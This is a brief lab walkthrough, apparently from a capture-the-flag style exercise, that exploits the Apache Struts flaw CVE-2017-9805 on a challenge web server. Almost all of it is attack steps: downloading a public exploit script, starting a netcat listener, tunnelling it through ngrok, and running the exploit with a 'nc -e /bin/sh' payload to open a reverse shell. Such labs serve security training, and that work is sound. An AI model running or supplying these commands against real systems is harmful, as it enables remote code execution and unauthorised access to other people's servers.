# Lab 5. Real-life RCE

Download [the exploit](https://github.com/chrisjd20/cve-2017-9805.py/blob/master/cve-2017-9805.py).

Take a look at https://dev.northpolechristmastown.com. Notice "Apache Struts" at the bottom of the page.

Start a netcat listener:
```
nc -nlvp 1337
```

Download and configure [ngrok](https://ngrok.com). Then run it in another shell and note the listening address and port number:
```
ngrok tcp 1337
```

Run the exploit:
```
python cve-2017-9805.py -u https://dev.northpolechristmastown.com/orders -c 'nc -e /bin/sh <address> <port>'
```
